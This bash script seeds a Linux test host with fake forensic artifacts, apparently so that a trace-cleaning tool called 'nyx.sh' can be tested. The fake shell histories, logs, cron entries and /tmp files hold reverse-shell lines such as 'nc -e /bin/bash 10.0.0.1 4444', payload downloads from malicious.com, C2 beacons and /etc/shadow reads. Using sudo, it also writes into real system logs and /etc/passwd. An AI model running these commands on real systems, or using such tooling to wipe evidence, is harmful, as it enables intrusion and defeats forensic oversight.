#!/bin/bash
# Script to create various forensic artifacts for testing

set -e

echo "================================"
echo "Creating Forensic Artifacts"
echo "================================"
echo ""

# Function to create artifacts
create_artifacts() {
    echo "[*] Creating shell history artifacts..."
    
    # Bash history
    echo "ls -la /etc/passwd" >> ~/.bash_history
    echo "sudo cat /etc/shadow" >> ~/.bash_history
    echo "wget http://malicious.com/payload.sh" >> ~/.bash_history
    echo "chmod +x payload.sh" >> ~/.bash_history
    echo "./payload.sh" >> ~/.bash_history
    printf "whoami\npwd\necho injected\n" >> ~/.bash_history
    
    # Zsh history
    echo ": 1234567890:0;ls -la /etc/passwd" >> ~/.zsh_history
    echo ": 1234567891:0;sudo cat /etc/shadow" >> ~/.zsh_history
    echo ": 1234567892:0;nc -lvp 4444" >> ~/.zsh_history
    HISTFILE=~/.zsh_history; printf ": 0:0;id\n" >> "$HISTFILE"
    
    # Python history
    echo "import os" >> ~/.python_history
    echo "os.system('whoami')" >> ~/.python_history
    echo "exec(open('/etc/passwd').read())" >> ~/.python_history
    
    # MySQL history
    echo "SELECT * FROM users WHERE password IS NOT NULL;" >> ~/.mysql_history
    echo "DROP DATABASE production;" >> ~/.mysql_history
    
    # SQLite history
    echo ".tables" >> ~/.sqlite_history
    echo "SELECT * FROM sensitive_data;" >> ~/.sqlite_history
    
    # R history
    echo "system('cat /etc/passwd')" >> ~/.Rhistory
    echo "data <- read.csv('/sensitive/data.csv')" >> ~/.Rhistory
    
    # GDB history
    echo "break main" >> ~/.gdb_history
    echo "run < /etc/passwd" >> ~/.gdb_history
    
    # MongoDB history
    echo "db.users.find({password: {$exists: true}})" >> ~/.mongo_history
    echo "db.dropDatabase()" >> ~/.mongo_history
    
    # Docker history
    echo "docker run -v /:/host alpine cat /host/etc/shadow" >> ~/.docker_history
    echo "docker exec -it container /bin/bash" >> ~/.docker_history
    
    # Vim info
    echo "# Recent files:" >> ~/.viminfo
    echo "'0  1  0  /etc/passwd" >> ~/.viminfo
    echo "'1  1  0  /etc/shadow" >> ~/.viminfo
    echo "'2  1  0  /home/testuser/secret.txt" >> ~/.viminfo
    
    # Less history
    echo "/etc/passwd" >> ~/.lesshst
    echo "/var/log/auth.log" >> ~/.lesshst
    
    # Wget history
    echo "http://malicious.com/payload.sh 1234567890" >> ~/.wget-hsts
    
    # Create .local/share histories
    mkdir -p ~/.local/share/mc ~/.local/share/nano
    echo "cd /etc" >> ~/.local/share/mc/history
    echo "view passwd" >> ~/.local/share/mc/history
    echo "password123" >> ~/.local/share/nano/search_history
    echo "secret_key" >> ~/.local/share/nano/search_history
    
    echo "[✓] Shell histories created"
    
    # Create some actual commands in current session
    history -s "sudo nmap -sS 192.168.1.0/24"
    history -s "curl http://c2server.com/beacon"
    
    # System logs (as root)
    echo "[*] Creating system log artifacts..."
    sudo bash -c '
        # Auth logs
        echo "Jan 1 12:00:00 testhost sshd[1234]: Failed password for root from 10.0.0.1 port 22 ssh2" >> /var/log/auth.log
        echo "Jan 1 12:00:01 testhost sshd[1234]: Accepted password for testuser from 10.0.0.1 port 22 ssh2" >> /var/log/auth.log
        echo "Jan 1 12:00:02 testhost sudo: testuser : TTY=pts/0 ; PWD=/home/testuser ; USER=root ; COMMAND=/bin/bash" >> /var/log/auth.log
        
        # Syslog
        echo "Jan 1 12:00:00 testhost kernel: [UFW BLOCK] IN=eth0 OUT= MAC=00:00:00:00:00:00 SRC=10.0.0.1 DST=10.0.0.2 LEN=52" >> /var/log/syslog
        echo "Jan 1 12:00:01 testhost systemd[1]: Started Reverse Shell Service" >> /var/log/syslog
        
        # Kernel logs
        echo "Jan 1 12:00:00 testhost kernel: Process hiding module loaded" >> /var/log/kern.log
        
        # Apache logs
        mkdir -p /var/log/apache2
        echo "10.0.0.1 - - [01/Jan/2024:12:00:00 +0000] \"GET /admin/config.php HTTP/1.1\" 200 1234" >> /var/log/apache2/access.log
        echo "[Mon Jan 01 12:00:00.123456 2024] [core:error] [pid 1234] [client 10.0.0.1:12345] File does not exist: /var/www/html/shell.php" >> /var/log/apache2/error.log
        
        # Nginx logs
        mkdir -p /var/log/nginx
        echo "10.0.0.1 - - [01/Jan/2024:12:00:00 +0000] \"POST /upload.php HTTP/1.1\" 200 1234 \"-\" \"curl/7.68.0\"" >> /var/log/nginx/access.log
        
        # Audit logs
        if [ -d "/var/log/audit" ]; then
            echo "type=EXECVE msg=audit(1234567890.123:456): argc=3 a0=\"/bin/bash\" a1=\"-c\" a2=\"nc -e /bin/bash 10.0.0.1 4444\"" >> /var/log/audit/audit.log
            echo "type=USER_LOGIN msg=audit(1234567890.123:457): pid=1234 uid=0 auid=1000 ses=1 msg=\"op=login id=1000 exe=\"/usr/sbin/sshd\" hostname=10.0.0.1 addr=10.0.0.1 terminal=/dev/pts/0 res=success\"" >> /var/log/audit/audit.log
        fi
        
        # Login records
        echo "testuser pts/0 10.0.0.1 $(date)" >> /var/log/wtmp
        echo "root pts/1 10.0.0.1 $(date)" >> /var/log/wtmp
        echo "testuser pts/0 10.0.0.1 $(date)" >> /var/log/lastlog
        
        # Failed login attempts
        echo "root ssh:notty 10.0.0.1 $(date)" >> /var/log/btmp
        echo "admin ssh:notty 10.0.0.1 $(date)" >> /var/log/btmp
        
        # Package manager logs
        echo "$(date) install malicious-package:amd64 <none> 1.0-1" >> /var/log/dpkg.log
        echo "$(date) install evilpkg" >> /var/log/dpkg.log
        echo "Commandline: apt-get install netcat" >> /var/log/apt/history.log
        echo "$(date) Installed: evilpkg" >> /var/log/apt/history.log
        echo "Install: netcat:amd64 (1.10-41)" >> /var/log/apt/term.log
        
        # Cron logs
        echo "$(date) (root) CMD (/tmp/backdoor.sh)" >> /var/log/cron
        echo "$(date) (testuser) CMD (curl http://c2server.com/beacon)" >> /var/log/cron.log
        
        # Mail logs
        echo "$(date) testhost postfix: to=<admin@target.com>, relay=evil.com" >> /var/log/mail.log
        echo "$(date) testhost sendmail: from=attacker@evil.com" >> /var/log/maillog
        
        # Firewall logs
        echo "$(date) [UFW BLOCK] SRC=10.0.0.1 DST=10.0.0.2 PROTO=TCP DPT=4444" >> /var/log/ufw.log
        
        # X11 logs
        echo "(EE) Failed to load module \"rootkit\" (module does not exist, 0)" >> /var/log/Xorg.0.log
        
        # CUPS logs
        mkdir -p /var/log/cups
        echo "E [$(date)] Suspicious print job from 10.0.0.1" >> /var/log/cups/error_log
        
        # Network daemon logs  
        echo "$(date) NetworkManager: <info> connection activated" >> /var/log/daemon.log
        
        # NetworkManager connections
        mkdir -p /etc/NetworkManager/system-connections
        echo "[connection]" >> /etc/NetworkManager/system-connections/EvilAP
        echo "id=EvilAP" >> /etc/NetworkManager/system-connections/EvilAP
        
        # Additional audit logs
        echo "type=SYSCALL msg=audit($(date +%s).123:999): syscall=59 exe=\"/bin/nc\"" >> /var/log/audit/ausearch.log
        
        # Current logins (utmp)
        echo "testuser pts/1 10.0.0.1 $(date)" >> /var/log/utmp
    '
    
    # Add journald entries (if systemd is available)
    logger "NYX-TEST: syslog marker" 2>/dev/null || echo "NYX-TEST: syslog marker" | sudo tee -a /var/log/syslog >/dev/null
    if command -v systemd-cat >/dev/null 2>&1; then
        sudo bash -c 'printf "NYX-TEST journald\n" | systemd-cat -t NYX-TEST' 2>/dev/null || true
    fi
    
    echo "[✓] System logs created"
    
    # Create some running processes that would show in logs
    echo "[*] Creating process artifacts..."
    # Start a background process that would appear suspicious
    (sleep 3600 &) 2>/dev/null
    
    # Create temporary files that might be logged
    touch /tmp/suspicious_script.sh
    touch /tmp/.hidden_file
    
    # Create Python/Perl scripts in temp
    echo "#!/usr/bin/python" > /tmp/backdoor.py
    echo "import socket; s=socket.socket(); s.connect(('10.0.0.1',4444))" >> /tmp/backdoor.py
    echo "#!/usr/bin/perl" > /tmp/exploit.pl
    echo "system('nc -e /bin/sh 10.0.0.1 4444');" >> /tmp/exploit.pl
    
    # Create thumbnail caches
    mkdir -p ~/.cache/thumbnails/normal ~/.thumbnails/normal
    touch ~/.cache/thumbnails/normal/suspicious_image.png
    touch ~/.thumbnails/normal/sensitive_doc.pdf.png
    
    # Create core dump
    echo "Core dump from suspicious process" > /tmp/core.12345
    
    echo "[✓] Process artifacts created"
    
    echo "[*] Creating Linux-specific artifacts..."
    
    # Create Trash
    mkdir -p ~/.local/share/Trash/files ~/.local/share/Trash/info
    echo "Deleted sensitive file" > ~/.local/share/Trash/files/sensitive.txt
    echo "[Trash Info]
Path=/home/testuser/sensitive.txt
DeletionDate=$(date +%Y-%m-%dT%H:%M:%S)" > ~/.local/share/Trash/info/sensitive.txt.trashinfo
    
    # Create GNOME Tracker databases
    mkdir -p ~/.cache/tracker3/files ~/.local/state/tracker
    echo "File access logs" > ~/.cache/tracker3/files/meta.db
    echo "Tracker state" > ~/.local/state/tracker/ontologies.db
    
    # Create Zeitgeist logs
    mkdir -p ~/.local/share/zeitgeist
    echo "Activity log database" > ~/.local/share/zeitgeist/activity.sqlite
    
    echo "[✓] Linux-specific artifacts created"
    
    echo "[*] Creating advanced Linux artifacts..."
    
    # GNOME Tracker + thumbnail cache
    mkdir -p ~/Pictures ~/Documents
    # Create a simple image using imagemagick if available
    if command -v convert >/dev/null 2>&1; then
        convert -size 64x64 xc:red ~/Pictures/red.png
        # Try to index with tracker if available
        if command -v tracker3 >/dev/null 2>&1; then
            tracker3 index ~/Pictures/red.png 2>/dev/null || true
        fi
    else
        # Fallback: create a simple file
        echo "test image" > ~/Pictures/red.png
    fi
    
    # Simulate opening file to generate thumbnail
    if command -v xdg-open >/dev/null 2>&1; then
        xdg-open ~/Pictures/red.png >/dev/null 2>&1 &
        sleep 2
        pkill xdg-open 2>/dev/null || true
    fi
    
    # Zeitgeist (older Ubuntu)
    if command -v zeitgeist-daemon >/dev/null 2>&1; then
        zeitgeist-daemon >/dev/null 2>&1 &
        touch ~/Documents/secret.txt
        xdg-open ~/Documents/secret.txt >/dev/null 2>&1 &
        sleep 2
        pkill xdg-open 2>/dev/null || true
    fi
    
    # Audit log entries (simulate if auditd not running)
    if command -v auditctl >/dev/null 2>&1 && sudo auditctl -l >/dev/null 2>&1; then
        sudo auditctl -w /etc/passwd -p wa -k NYXTEST 2>/dev/null || true
        sudo bash -c 'echo "# dummy change for NYXTEST" >> /etc/passwd'
        sleep 1
        sudo auditctl -D 2>/dev/null || true  # Remove rule but keep event
    else
        # Simulate audit log entry
        sudo bash -c 'echo "type=SYSCALL msg=audit($(date +%s).123:999): syscall=59 exe=\"/bin/nc\" key=\"NYXTEST\"" >> /var/log/audit/audit.log'
    fi
    
    # NetworkManager connection artifact
    if command -v nmcli >/dev/null 2>&1; then
        sudo nmcli c add type ethernet ifname nyx-test con-name NYX-TEST \
            ipv4.method disabled ipv6.method ignore 2>/dev/null || true
    fi
    
    echo "[✓] Advanced Linux artifacts created"
    
    echo "[*] Creating package manager artifacts..."
    
    # APT/DPKG artifacts
    if command -v apt >/dev/null 2>&1 || command -v dpkg >/dev/null 2>&1; then
        sudo bash -c '
            # APT archives
            mkdir -p /var/cache/apt/archives
            echo "Cached package data" > /var/cache/apt/archives/malicious-tool_1.0_amd64.deb
            echo "Cached exploit kit" > /var/cache/apt/archives/nmap_7.80_amd64.deb
            
            # APT logs
            mkdir -p /var/log/apt
            echo "Start-Date: $(date)" >> /var/log/apt/history.log
            echo "Commandline: apt-get install netcat-openbsd" >> /var/log/apt/history.log
            echo "Install: netcat-openbsd:amd64 (1.195-2ubuntu1)" >> /var/log/apt/history.log
            echo "End-Date: $(date)" >> /var/log/apt/history.log
            
            echo "$(date) install netcat-openbsd:amd64 <none> 1.195-2ubuntu1" >> /var/log/apt/term.log
            echo "$(date) install hydra:amd64 <none> 9.0-1" >> /var/log/apt/term.log
            
            # DPKG logs
            echo "$(date) startup packages configure" >> /var/log/dpkg.log
            echo "$(date) install netcat-openbsd:amd64 <none> 1.195-2ubuntu1" >> /var/log/dpkg.log
            echo "$(date) install john:amd64 <none> 1.9.0-2" >> /var/log/dpkg.log
        '
    fi
    
    # YUM/DNF artifacts (simulate even if not present)
    sudo bash -c '
        mkdir -p /var/cache/yum /var/cache/dnf
        echo "Cached RPM data" > /var/cache/yum/x86_64/7/base/suspicious-tool-1.0-1.x86_64.rpm
        echo "DNF cache data" > /var/cache/dnf/fedora/packages/ncat-7.70-1.fc30.x86_64.rpm
        
        echo "$(date) Installed: nmap-7.70-1.fc30.x86_64" >> /var/log/yum.log
        echo "$(date) Installed: john-1.9.0-1.el8.x86_64" >> /var/log/yum.log
        
        echo "$(date) INFO Installing: ncat-7.70-1.fc30.x86_64" >> /var/log/dnf.log
        echo "$(date) INFO Installed: hydra-9.0-1.fc30.x86_64" >> /var/log/dnf.log
    '
    
    # Pacman artifacts (simulate even if not present)
    sudo bash -c '
        mkdir -p /var/cache/pacman/pkg
        echo "Pacman package cache" > /var/cache/pacman/pkg/nmap-7.80-1-x86_64.pkg.tar.xz
        echo "Pacman package cache" > /var/cache/pacman/pkg/john-1.9.0-1-x86_64.pkg.tar.xz
        
        echo "[$(date)] [ALPM] installed nmap (7.80-1)" >> /var/log/pacman.log
        echo "[$(date)] [ALPM] installed netcat (0.7.1-6)" >> /var/log/pacman.log
    '
    
    echo "[✓] Package manager artifacts created"
    
    echo "[*] Creating container/VM artifacts..."
    
    # Docker artifacts
    sudo bash -c '
        # Docker container logs
        mkdir -p /var/lib/docker/containers/abc123def456/
        echo "$(date) Container started with suspicious command: nc -e /bin/bash 10.0.0.1 4444" > /var/lib/docker/containers/abc123def456/abc123def456-json.log
        echo "$(date) Downloading payload from C2 server" >> /var/lib/docker/containers/abc123def456/abc123def456-json.log
        
        mkdir -p /var/lib/docker/containers/def456ghi789/
        echo "$(date) Alpine container executing: cat /etc/shadow" > /var/lib/docker/containers/def456ghi789/def456ghi789-json.log
    '
    
    # User Docker config
    mkdir -p ~/.docker ~/.docker/machine/machines/evil-host
    echo '{"auths":{"registry.evil.com":{"auth":"YWRtaW46cGFzc3dvcmQ="}}}' > ~/.docker/config.json
    echo '{"Driver":{"MachineName":"evil-host","IPAddress":"10.0.0.1"}}' > ~/.docker/machine/machines/evil-host/config.json
    
    # Podman/K8s artifacts
    sudo bash -c '
        mkdir -p /var/lib/containers/storage/overlay/123abc/userdata
        echo "Podman overlay userdata" > /var/lib/containers/storage/overlay/123abc/userdata/suspicious-mount.json
        
        mkdir -p /var/log/pods/kube-system_malicious-pod_abc123
        echo "$(date) Pod log: Executing privilege escalation" > /var/log/pods/kube-system_malicious-pod_abc123/container.log
    '
    
    # Libvirt/QEMU artifacts
    sudo bash -c '
        mkdir -p /var/log/libvirt/qemu /var/cache/libvirt/qemu
        echo "$(date): starting up libvirt version: 6.0.0" > /var/log/libvirt/qemu/evil-vm.log
        echo "$(date): QEMU_MONITOR_EVENT: event=POWERDOWN" >> /var/log/libvirt/qemu/evil-vm.log
        
        echo "QEMU cache data" > /var/cache/libvirt/qemu/capabilities.xml
        echo "VM metadata cache" > /var/cache/libvirt/qemu/evil-vm.xml
    '
    
    echo "[✓] Container/VM artifacts created"
    
    echo "[*] Creating browser artifacts..."
    
    # Firefox artifacts
    mkdir -p ~/.mozilla/firefox/profile.default-release/cache2/entries
    mkdir -p ~/.mozilla/firefox/profile.default-release/storage/default
    mkdir -p ~/.mozilla/firefox/profile.default-release/thumbnails
    mkdir -p ~/.mozilla/firefox/profile.default-release/sessionstore-backups
    
    echo "Mozilla cache entry" > ~/.mozilla/firefox/profile.default-release/cache2/entries/evil-site-cache
    echo "Storage data" > ~/.mozilla/firefox/profile.default-release/storage/default/evil-site-storage
    echo "Thumbnail data" > ~/.mozilla/firefox/profile.default-release/thumbnails/evil-thumbnail.jpg
    echo "Session backup" > ~/.mozilla/firefox/profile.default-release/sessionstore-backups/recovery.jsonlz4
    
    # Create SQLite databases with test data
    if command -v sqlite3 >/dev/null 2>&1; then
        sqlite3 ~/.mozilla/firefox/profile.default-release/places.sqlite "CREATE TABLE moz_places (url TEXT); INSERT INTO moz_places VALUES ('http://evil-c2-server.com/panel');"
        sqlite3 ~/.mozilla/firefox/profile.default-release/cookies.sqlite "CREATE TABLE moz_cookies (host TEXT, name TEXT); INSERT INTO moz_cookies VALUES ('evil-site.com', 'session_token');"
        sqlite3 ~/.mozilla/firefox/profile.default-release/formhistory.sqlite "CREATE TABLE moz_formhistory (fieldname TEXT, value TEXT); INSERT INTO moz_formhistory VALUES ('password', 'admin123');"
    else
        echo "places.sqlite content" > ~/.mozilla/firefox/profile.default-release/places.sqlite
        echo "cookies.sqlite content" > ~/.mozilla/firefox/profile.default-release/cookies.sqlite
        echo "formhistory.sqlite content" > ~/.mozilla/firefox/profile.default-release/formhistory.sqlite
    fi
    
    # Chrome/Chromium artifacts
    mkdir -p ~/.config/google-chrome/Default/Cache
    mkdir -p ~/.config/google-chrome/Default
    mkdir -p ~/.config/chromium/Default/Cache
    mkdir -p ~/.config/chromium/Default
    
    echo "Chrome cache data" > ~/.config/google-chrome/Default/Cache/evil-cache-entry
    echo "Chrome history data" > ~/.config/google-chrome/Default/History
    echo "Chrome cookies data" > ~/.config/google-chrome/Default/Cookies
    echo "Chrome web data" > ~/.config/google-chrome/Default/Web\ Data
    echo "Chrome top sites" > ~/.config/google-chrome/Default/Top\ Sites
    
    echo "Chromium cache data" > ~/.config/chromium/Default/Cache/evil-cache-entry
    echo "Chromium history data" > ~/.config/chromium/Default/History
    echo "Chromium cookies data" > ~/.config/chromium/Default/Cookies
    echo "Chromium web data" > ~/.config/chromium/Default/Web\ Data
    echo "Chromium top sites" > ~/.config/chromium/Default/Top\ Sites
    
    echo "[✓] Browser artifacts created"
    
    echo "[*] Creating SSH artifacts..."
    
    # SSH user artifacts
    mkdir -p ~/.ssh
    echo "# SSH known hosts" > ~/.ssh/known_hosts
    echo "evil-server.com,10.0.0.1 ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC..." >> ~/.ssh/known_hosts
    echo "c2-server.evil.com,192.168.1.100 ssh-ed25519 AAAAC3NzaC1lZDI1NTE5..." >> ~/.ssh/known_hosts
    echo "compromised-server.org,203.0.113.1 ecdsa-sha2-nistp256 AAAAE2VjZHNh..." >> ~/.ssh/known_hosts
    
    echo "$(date) SSH connection established to evil-server.com" > ~/.ssh/connection.log
    echo "$(date) Key exchange completed with c2-server.evil.com" > ~/.ssh/debug.log
    
    # System SSH logs
    sudo bash -c '
        # Add SSH entries to auth.log that should be cleaned
        echo "$(date) testhost sshd[12345]: Accepted publickey for root from 10.0.0.1 port 22 ssh2: RSA SHA256:abc123..." >> /var/log/auth.log
        echo "$(date) testhost sshd[12346]: Connection from 192.168.1.100 port 54321 on 10.0.0.2 port 22" >> /var/log/auth.log
        echo "$(date) testhost sshd[12347]: Failed password for admin from 203.0.113.1 port 22 ssh2" >> /var/log/auth.log
        echo "$(date) testhost sshd[12348]: Disconnected from invalid user hacker 10.0.0.1 port 22" >> /var/log/auth.log
        
        echo "$(date) testhost sshd[12349]: Accepted password for testuser from 10.0.0.1 port 22 ssh2" >> /var/log/secure
        echo "$(date) testhost sshd[12350]: pam_unix(sshd:session): session opened for user testuser by (uid=0)" >> /var/log/secure
    '
    
    echo "[✓] SSH artifacts created"
    
    echo "[*] Creating additional systemd artifacts..."
    
    sudo bash -c '
        # systemd random seed
        echo "SystemD random seed data" > /var/lib/systemd/random-seed
        
        # Live session journal traces
        mkdir -p /run/log/journal/abc123def456
        echo "Live session journal entry" > /run/log/journal/abc123def456/system.journal
        echo "Runtime journal entry" > /run/log/journal/abc123def456/user-1000.journal
    '
    
    echo "[✓] Additional systemd artifacts created"
    
    echo "[*] Creating print subsystem artifacts..."
    
    sudo bash -c '
        # CUPS artifacts
        mkdir -p /var/spool/cups /var/log/cups
        
        # Print job spools
        echo "PostScript print job data" > /var/spool/cups/c00001
        echo "PDF print job data" > /var/spool/cups/c00002
        echo "Suspicious document print job" > /var/spool/cups/c00003
        
        # CUPS logs
        echo "I [$(date)] Accepting connections." > /var/log/cups/access_log
        echo "10.0.0.1 - - [$(date)] \"POST /printers/LaserJet HTTP/1.1\" 200 0 Print-Job successful-ok" >> /var/log/cups/access_log
        echo "192.168.1.100 - - [$(date)] \"POST /printers/HP-Printer HTTP/1.1\" 200 0 Print-Job confidential-document.pdf" >> /var/log/cups/access_log
        
        echo "E [$(date)] Unable to encrypt connection from 10.0.0.1!" > /var/log/cups/error_log
        echo "W [$(date)] Suspicious print job from unauthorized user at 192.168.1.100" >> /var/log/cups/error_log
        
        echo "I [$(date)] Job 1 queued on \"HP-Printer\" by \"testuser\"." > /var/log/cups/page_log
        echo "I [$(date)] Job 2 queued on \"LaserJet\" by \"admin\"." >> /var/log/cups/page_log
    '
    
    echo "[✓] Print subsystem artifacts created"
    
    echo "[*] Creating additional forensic artifacts..."
    
    # DHCP leases
    sudo bash -c '
        mkdir -p /var/lib/dhclient
        echo "lease {" > /var/lib/dhclient/dhclient.eth0.leases
        echo "  interface \"eth0\";" >> /var/lib/dhclient/dhclient.eth0.leases
        echo "  fixed-address 192.168.1.100;" >> /var/lib/dhclient/dhclient.eth0.leases
        echo "  server-name \"evil-dhcp-server\";" >> /var/lib/dhclient/dhclient.eth0.leases
        echo "}" >> /var/lib/dhclient/dhclient.eth0.leases
    '
    
    # Create GTK bookmarks
    mkdir -p ~/.config/gtk-3.0
    echo "file:///tmp/suspicious-files Suspicious Files" > ~/.config/gtk-3.0/bookmarks
    echo "file:///home/testuser/malware Malware Collection" >> ~/.config/gtk-3.0/bookmarks
    
    # Create recently used files
    mkdir -p ~/.local/share
    echo '<?xml version="1.0" encoding="UTF-8"?>' > ~/.local/share/recently-used.xbel
    echo '<xbel version="1.0">' >> ~/.local/share/recently-used.xbel
    echo '  <bookmark href="file:///tmp/suspicious-script.sh" added="2024-01-01T12:00:00Z" modified="2024-01-01T12:00:00Z" visited="2024-01-01T12:00:00Z"/>' >> ~/.local/share/recently-used.xbel
    echo '  <bookmark href="file:///home/testuser/payload.bin" added="2024-01-01T12:01:00Z" modified="2024-01-01T12:01:00Z" visited="2024-01-01T12:01:00Z"/>' >> ~/.local/share/recently-used.xbel
    echo '</xbel>' >> ~/.local/share/recently-used.xbel
    
    # Create crash dumps in known locations
    sudo bash -c '
        mkdir -p /var/crash
        echo "Core dump from suspicious process" > /var/crash/core.suspicious-binary.12345.gz
        echo "Crash report data" > /var/crash/_usr_bin_evil-tool.12345.crash
    '
    
    # VS Code/Editor traces
    mkdir -p ~/.local/share/code-server/User ~/.config/Code/User
    echo '{"recentFiles":["/tmp/backdoor.py","/etc/passwd"]}' > ~/.local/share/code-server/User/settings.json
    echo '{"workbench.startupEditor": "none", "files.associations": {"*.evil": "plaintext"}}' > ~/.config/Code/User/settings.json
    
    # JetBrains traces
    mkdir -p ~/.local/share/.IntelliJIdea2023.1/system/log
    echo "$(date) - Opened file: /tmp/malicious-script.py" > ~/.local/share/.IntelliJIdea2023.1/system/log/idea.log
    
    echo "[✓] Additional forensic artifacts created"
}

# Count artifacts before creation
count_artifacts() {
    local count=0
    
    # Count history files with content
    for file in ~/.bash_history ~/.zsh_history ~/.python_history ~/.mysql_history ~/.sqlite_history ~/.viminfo ~/.lesshst ~/.wget-hsts; do
        if [ -s "$file" ]; then
            count=$((count + 1))
        fi
    done
    
    # Count system logs with content (need sudo)
    sudo bash -c '
        for log in /var/log/auth.log /var/log/syslog /var/log/kern.log /var/log/apache2/access.log /var/log/apache2/error.log /var/log/nginx/access.log /var/log/audit/audit.log /var/log/wtmp /var/log/btmp /var/log/lastlog; do
            if [ -s "$log" ] 2>/dev/null; then
                count=$((count + 1))
            fi
        done
        echo $count
    ' | read sys_count 2>/dev/null || sys_count=0
    
    count=$((count + sys_count))
    echo $count
}

# Main execution
echo "[*] Initial artifact count: $(count_artifacts)"
echo ""

create_artifacts

echo ""
echo "[*] Final artifact count: $(count_artifacts)"
echo ""
echo "================================"
echo "Artifact Creation Complete!"
echo "================================"
echo ""
echo "Artifacts created in:"
echo "  - Shell histories: ~/.bash_history, ~/.zsh_history, etc."
echo "  - System logs: /var/log/auth.log, /var/log/syslog, etc."
echo "  - Audit logs: /var/log/audit/audit.log"
echo "  - Web server logs: /var/log/apache2/*, /var/log/nginx/*"
echo ""
echo "Run 'nyx.sh' to clean these artifacts"
